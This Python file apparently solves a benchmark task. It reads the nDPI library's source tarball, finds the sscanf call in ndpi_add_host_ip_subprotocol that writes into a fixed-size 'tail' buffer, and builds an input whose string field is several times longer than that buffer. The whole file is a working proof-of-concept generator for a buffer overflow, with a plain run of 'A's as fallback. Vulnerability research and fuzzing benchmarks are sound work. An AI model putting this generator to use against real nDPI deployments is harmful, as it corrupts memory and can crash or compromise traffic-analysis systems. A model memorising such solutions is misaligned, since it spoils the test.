import re
import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        ndpi_main_content = None
        try:
            with tarfile.open(src_path, "r:*") as tar:
                for member in tar.getmembers():
                    if member.isfile() and member.name.endswith("ndpi_main.c"):
                        f = tar.extractfile(member)
                        if f is not None:
                            ndpi_main_content = f.read().decode("utf-8", "replace")
                            break
        except Exception:
            ndpi_main_content = None

        if ndpi_main_content:
            try:
                poc = self._generate_poc(ndpi_main_content)
                if poc:
                    return poc
            except Exception:
                pass

        # Fallback: generic overflowing string
        return b"A" * 128

    def _generate_poc(self, content: str) -> bytes:
        body = self._extract_func_body(content, "ndpi_add_host_ip_subprotocol")
        if body is None:
            return None

        tail_size = self._extract_tail_size_from_body(body)
        if tail_size is None:
            tail_size = 16

        fmt_info = self._find_sscanf_with_tail(body, content)
        if fmt_info is None:
            return None
        fmt_str, tail_arg_index = fmt_info

        poc_str = self._build_input_from_format(fmt_str, tail_arg_index, tail_size)
        if poc_str is None:
            return None

        return poc_str.encode("ascii", "replace")

    def _extract_tail_size_from_body(self, body: str):
        m = re.search(r"\bchar\s+tail\s*\[\s*(\d+)\s*\]", body)
        if m:
            try:
                return int(m.group(1))
            except ValueError:
                return None
        return None

    def _extract_func_body(self, text: str, func_name: str):
        pattern = re.compile(
            r"%s\s*\([^)]*\)\s*\{" % re.escape(func_name), re.DOTALL
        )
        m = pattern.search(text)
        if not m:
            return None

        brace_index = text.find("{", m.start())
        if brace_index == -1:
            return None

        return self._extract_block(text, brace_index)

    def _extract_block(self, text: str, brace_index: int):
        depth = 0
        start = None
        i = brace_index
        n = len(text)

        in_str = False
        in_char = False
        in_line_cmt = False
        in_block_cmt = False
        escaped = False

        while i < n:
            c = text[i]

            if in_str:
                if escaped:
                    escaped = False
                elif c == "\\":
                    escaped = True
                elif c == '"':
                    in_str = False
                i += 1
                continue

            if in_char:
                if escaped:
                    escaped = False
                elif c == "\\":
                    escaped = True
                elif c == "'":
                    in_char = False
                i += 1
                continue

            if in_line_cmt:
                if c == "\n":
                    in_line_cmt = False
                i += 1
                continue

            if in_block_cmt:
                if c == "*" and i + 1 < n and text[i + 1] == "/":
                    in_block_cmt = False
                    i += 2
                    continue
                i += 1
                continue

            # normal mode
            if c == "/" and i + 1 < n:
                nxt = text[i + 1]
                if nxt == "/":
                    in_line_cmt = True
                    i += 2
                    continue
                elif nxt == "*":
                    in_block_cmt = True
                    i += 2
                    continue

            if c == '"':
                in_str = True
                i += 1
                continue

            if c == "'":
                in_char = True
                i += 1
                continue

            if c == "{":
                depth += 1
                if depth == 1:
                    start = i + 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    end = i
                    if start is not None:
                        return text[start:end]
            i += 1

        return None

    def _find_sscanf_with_tail(self, body: str, full_source: str):
        for call in self._iter_sscanf_calls(body):
            args_str = call["args"]
            args = self._split_c_arguments(args_str)
            if len(args) < 3:
                continue

            fmt_expr = args[1].strip()
            fmt_str = self._resolve_format_expr(fmt_expr, full_source)
            if not fmt_str:
                continue

            extra_args = args[2:]
            for idx, arg in enumerate(extra_args):
                if re.search(r"\btail\b", arg):
                    return fmt_str, idx

        return None

    def _iter_sscanf_calls(self, body: str):
        n = len(body)
        i = 0

        while i < n:
            idx = body.find("sscanf", i)
            if idx == -1:
                break

            if idx > 0 and (body[idx - 1].isalnum() or body[idx - 1] == "_"):
                i = idx + 6
                continue

            j = idx + 6
            while j < n and body[j].isspace():
                j += 1
            if j >= n or body[j] != "(":
                i = j
                continue

            start_paren = j
            k = start_paren
            depth = 0

            in_str = False
            in_char = False
            in_line_cmt = False
            in_block_cmt = False
            escaped = False

            while k < n:
                c = body[k]

                if in_str:
                    if escaped:
                        escaped = False
                    elif c == "\\":
                        escaped = True
                    elif c == '"':
                        in_str = False
                    k += 1
                    continue

                if in_char:
                    if escaped:
                        escaped = False
                    elif c == "\\":
                        escaped = True
                    elif c == "'":
                        in_char = False
                    k += 1
                    continue

                if in_line_cmt:
                    if c == "\n":
                        in_line_cmt = False
                    k += 1
                    continue

                if in_block_cmt:
                    if c == "*" and k + 1 < n and body[k + 1] == "/":
                        in_block_cmt = False
                        k += 2
                        continue
                    k += 1
                    continue

                if c == "/" and k + 1 < n:
                    nxt = body[k + 1]
                    if nxt == "/":
                        in_line_cmt = True
                        k += 2
                        continue
                    elif nxt == "*":
                        in_block_cmt = True
                        k += 2
                        continue

                if c == '"':
                    in_str = True
                    k += 1
                    continue

                if c == "'":
                    in_char = True
                    k += 1
                    continue

                if c == "(":
                    depth += 1
                elif c == ")":
                    depth -= 1
                    if depth == 0:
                        args_str = body[start_paren + 1 : k]
                        yield {"start": idx, "end": k, "args": args_str}
                        break
                k += 1

            i = k + 1

    def _split_c_arguments(self, s: str):
        args = []
        buf = []
        n = len(s)
        i = 0

        in_str = False
        in_char = False
        in_line_cmt = False
        in_block_cmt = False
        escaped = False
        paren_depth = 0
        bracket_depth = 0
        brace_depth = 0

        while i < n:
            c = s[i]

            if in_str:
                buf.append(c)
                if escaped:
                    escaped = False
                elif c == "\\":
                    escaped = True
                elif c == '"':
                    in_str = False
                i += 1
                continue

            if in_char:
                buf.append(c)
                if escaped:
                    escaped = False
                elif c == "\\":
                    escaped = True
                elif c == "'":
                    in_char = False
                i += 1
                continue

            if in_line_cmt:
                buf.append(c)
                if c == "\n":
                    in_line_cmt = False
                i += 1
                continue

            if in_block_cmt:
                buf.append(c)
                if c == "*" and i + 1 < n and s[i + 1] == "/":
                    buf.append("/")
                    i += 2
                    in_block_cmt = False
                    continue
                i += 1
                continue

            if c == "/" and i + 1 < n:
                nxt = s[i + 1]
                if nxt == "/":
                    buf.append(c)
                    buf.append(nxt)
                    i += 2
                    in_line_cmt = True
                    continue
                elif nxt == "*":
                    buf.append(c)
                    buf.append(nxt)
                    i += 2
                    in_block_cmt = True
                    continue

            if c == '"':
                buf.append(c)
                i += 1
                in_str = True
                continue

            if c == "'":
                buf.append(c)
                i += 1
                in_char = True
                continue

            if c == "(":
                paren_depth += 1
                buf.append(c)
                i += 1
                continue

            if c == ")":
                paren_depth -= 1
                buf.append(c)
                i += 1
                continue

            if c == "[":
                bracket_depth += 1
                buf.append(c)
                i += 1
                continue

            if c == "]":
                bracket_depth -= 1
                buf.append(c)
                i += 1
                continue

            if c == "{":
                brace_depth += 1
                buf.append(c)
                i += 1
                continue

            if c == "}":
                brace_depth -= 1
                buf.append(c)
                i += 1
                continue

            if (
                c == ","
                and paren_depth == 0
                and bracket_depth == 0
                and brace_depth == 0
            ):
                arg = "".join(buf).strip()
                if arg:
                    args.append(arg)
                buf = []
                i += 1
                continue

            buf.append(c)
            i += 1

        last = "".join(buf).strip()
        if last:
            args.append(last)

        return args

    def _resolve_format_expr(self, expr: str, full_source: str):
        expr = expr.strip()
        literals = re.findall(r'"([^"\\]*(?:\\.[^"\\]*)*)"', expr)
        if literals:
            parts = [self._unescape_c_string(lit) for lit in literals]
            return "".join(parts)

        m = re.search(r"\b([A-Za-z_][A-Za-z0-9_]*)\b", expr)
        if not m:
            return None
        macro = m.group(1)

        pattern = re.compile(
            r"#\s*define\s+"
            + re.escape(macro)
            + r'\s+"([^"\\]*(?:\\.[^"\\]*)*)"',
            re.MULTILINE,
        )
        m2 = pattern.search(full_source)
        if not m2:
            return None

        return self._unescape_c_string(m2.group(1))

    def _unescape_c_string(self, s: str):
        try:
            return bytes(s, "utf-8").decode("unicode_escape")
        except Exception:
            replacements = {
                r"\n": "\n",
                r"\t": "\t",
                r"\r": "\r",
                r"\"": '"',
                r"\\": "\\",
                r"\0": "\0",
            }
            out = s
            for k, v in replacements.items():
                out = out.replace(k, v)
            return out

    def _parse_format_specs(self, fmt: str, tail_extra_index: int):
        specs = []
        i = 0
        n = len(fmt)
        unsup_arg_index = -1

        while i < n:
            if fmt[i] != "%":
                i += 1
                continue

            if i + 1 < n and fmt[i + 1] == "%":
                i += 2
                continue

            start = i
            j = i + 1

            # flags
            while j < n and fmt[j] in "#0- +":
                j += 1

            # assignment suppression
            suppress = False
            if j < n and fmt[j] == "*":
                suppress = True
                j += 1

            # width
            width = None
            width_str = ""
            while j < n and fmt[j].isdigit():
                width_str += fmt[j]
                j += 1
            if width_str:
                try:
                    width = int(width_str)
                except ValueError:
                    width = None

            # precision (ignored)
            if j < n and fmt[j] == ".":
                j += 1
                while j < n and fmt[j].isdigit():
                    j += 1

            # length (ignored mostly)
            if j < n and fmt[j] in "hjlztL":
                if fmt[j] in "hl" and j + 1 < n and fmt[j + 1] == fmt[j]:
                    j += 2
                else:
                    j += 1

            if j >= n:
                break

            conv = fmt[j]

            if conv == "[":
                k = j + 1
                if k < n and fmt[k] == "^":
                    k += 1
                if k < n and fmt[k] == "]":
                    k += 1
                while k < n and fmt[k] != "]":
                    k += 1
                if k >= n:
                    end = n - 1
                else:
                    end = k
                j = end
            end = j

            arg_idx = None
            if not suppress:
                unsup_arg_index += 1
                arg_idx = unsup_arg_index

            specs.append(
                {
                    "start": start,
                    "end": end,
                    "conv": conv,
                    "suppress": suppress,
                    "width": width,
                    "arg_index": arg_idx,
                }
            )

            i = end + 1

        tail_spec = None
        for spec in specs:
            if spec["arg_index"] == tail_extra_index:
                tail_spec = spec
                break

        return specs, tail_spec

    def _transform_literal(self, literal: str) -> str:
        out_chars = []
        last_space = False
        for ch in literal:
            if ch.isspace():
                if not last_space:
                    out_chars.append(" ")
                    last_space = True
            else:
                out_chars.append(ch)
                last_space = False
        return "".join(out_chars)

    def _make_token_for_spec(self, spec, is_tail: bool, tail_size: int) -> str:
        conv = spec["conv"]
        if conv in "diouxX":
            return "7"
        if conv in "fFeEgGaA":
            return "3.14"
        if conv == "c":
            width = spec["width"] if spec["width"] and spec["width"] > 0 else 1
            return "Z" * width
        if conv in "s[":
            if is_tail:
                over_len = max(tail_size * 4, tail_size + 32, 64)
                return "T" * over_len
            else:
                return "w"
        if conv == "p":
            return "0x1"
        if conv == "n":
            return ""
        return "1"

    def _build_input_from_format(self, fmt: str, tail_extra_index: int, tail_size: int):
        specs, tail_spec = self._parse_format_specs(fmt, tail_extra_index)

        if tail_spec is None:
            # Fallback: choose last string-like spec as tail
            for spec in reversed(specs):
                if spec["conv"] in "s[":
                    tail_spec = spec
                    break

        if tail_spec is None:
            return None

        pieces = []
        pos = 0
        for spec in specs:
            literal = fmt[pos : spec["start"]]
            if literal:
                pieces.append(self._transform_literal(literal))
            is_tail = spec is tail_spec
            token = self._make_token_for_spec(spec, is_tail, tail_size)
            pieces.append(token)
            pos = spec["end"] + 1

        if pos < len(fmt):
            pieces.append(self._transform_literal(fmt[pos:]))

        result = "".join(pieces)
        if not result.endswith("\n"):
            result += "\n"
        return result